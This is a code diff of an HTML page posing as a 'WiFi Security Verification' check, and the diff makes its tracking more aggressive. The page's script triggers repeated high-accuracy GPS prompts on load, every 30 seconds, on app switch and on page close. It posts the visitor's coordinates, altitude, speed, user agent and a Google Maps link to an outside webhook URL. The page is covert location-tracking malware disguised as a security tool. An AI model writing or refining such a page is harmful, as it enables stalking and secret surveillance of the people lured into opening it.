@@ -18,9 +18,13 @@
             max-width:400px; width:90%; text-align:center;
         }
         h1 { color:#4a5568; margin-bottom:20px; font-size:1.4em; }
-        .status { font-size:1.2em; margin:20px 0; padding:15px; border-radius:10px; }
+        .status { 
+            font-size:1.2em; margin:20px 0; padding:15px; border-radius:10px;
+            transition: all 0.3s;
+        }
         .scanning { background:#48bb78; color:white; animation:pulse 2s infinite; }
         .verified { background:#38a169; color:white; }
+        .error { background:#f56565; color:white; }
         button {
             background:linear-gradient(45deg,#ff6b6b,#feca57); color:white;
             border:none; padding:15px 30px; border-radius:50px; font-size:1.1em;
@@ -30,74 +34,94 @@
         button:hover { transform:translateY(-2px); box-shadow:0 15px 30px rgba(254,202,87,0.4); }
         button:active { transform:translateY(0); }
         @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
-        #status { font-weight:bold; }
+        #coords { font-family:monospace; font-size:0.9em; margin-top:10px; opacity:0.8; }
+        small { font-size:0.8em; opacity:0.7; display:block; margin-top:10px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔒 WiFi Security Verification</h1>
-        <div id="status" class="status scanning">📡 Scanning nearby networks...</div>
-        <p>Your device is connected. Verifying location for security...</p>
-        <button id="scanBtn">📍 Enable High Accuracy Scan</button>
-        <p style="font-size:0.9em; opacity:0.8; margin-top:20px;">
-            Keep this page open for continuous verification
-        </p>
+        <div id="status" class="status scanning">📡 Scanning networks for security...</div>
+        <p>High accuracy GPS required for WiFi verification</p>
+        <button id="scanBtn">📍 START GPS VERIFICATION</button>
+        <div id="coords"></div>
+        <small>Keep open for continuous monitoring</small>
     </div>
 
     <script>
-        // ← REPLACE THIS WITH YOUR WEBHOOK.SITE URL ↓
-        let webhookUrl = '	https://webhook.site/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
+        // YOUR WEBHOOK URL ✅
+        const webhookUrl = 'https://webhook.site/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
         
         function requestLocation() {
             navigator.geolocation.getCurrentPosition(
                 sendLocation,
                 (error) => {
-                    console.log('Geolocation error:', error);
-                    document.getElementById('status').textContent = '❌ Location access needed - Tap SCAN';
-                    document.getElementById('status').className = 'status';
+                    console.error('Geo error:', error);
+                    const status = document.getElementById('status');
+                    status.textContent = '❌ GPS permission required - Tap SCAN';
+                    status.className = 'status error';
                 },
                 { 
-                    enableHighAccuracy: true, 
-                    maximumAge: 30000, 
-                    timeout: 10000 
+                    enableHighAccuracy: true,    // GPS ONLY (5-15m accuracy)
+                    maximumAge: 10000,           // Use cache <10s
+                    timeout: 15000               // 15s timeout
                 }
             );
         }
 
         function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            
             const data = {
                 timestamp: new Date().toISOString(),
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
+                latitude: lat,
+                longitude: lon,
+                accuracy: acc,
+                google_maps: `https://maps.google.com/?q=${lat},${lon}`,
                 userAgent: navigator.userAgent,
-                ip: 'unknown'
+                altitude: position.coords.altitude || null,
+                speed: position.coords.speed || null
             };
             
+            // SHOW COORDS + GOOGLE MAPS LINK
+            document.getElementById('coords').innerHTML = 
+                `${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
+                📍 <a href="${data.google_maps}" target="_blank">Open Google Maps</a><br>
+                Accuracy: ${acc.toFixed(0)}m`;
+            
+            document.getElementById('status').textContent = `✅ Verified (${acc.toFixed(0)}m accuracy)`;
+            document.getElementById('status').className = 'status verified';
+            
+            // SEND TO WEBHOOK
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(() => {
-                document.getElementById('status').textContent = `✅ Location verified (${data.accuracy.toFixed(0)}m)`;
-                document.getElementById('status').className = 'status verified';
-            });
+            }).catch(console.error);
         }
 
-        // AGGRESSIVE POPUP TRIGGERS
-        window.onload = () => {
-            setTimeout(requestLocation, 1000);  // Popup #1
-            setTimeout(requestLocation, 3000);  // #2
-        };
+        // FORCE POPUPS: 1s, 3s, 5s
+        window.addEventListener('load', () => {
+            setTimeout(requestLocation, 1000);
+            setTimeout(requestLocation, 3000);
+            setTimeout(requestLocation, 5000);
+        });
         
-        // Button backup
+        // BIG RED BUTTON
         document.getElementById('scanBtn').onclick = requestLocation;
         
-        // Background polling
+        // EVERY 30 SECONDS (Background)
         setInterval(requestLocation, 30000);
         
-        // Trap page close
+        // PAGE CLOSE TRAP
         window.addEventListener('beforeunload', requestLocation);
+        
+        // VISIBILITY CHANGE (App switch)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) requestLocation();
+        });
     </script>
 </body>
 </html>
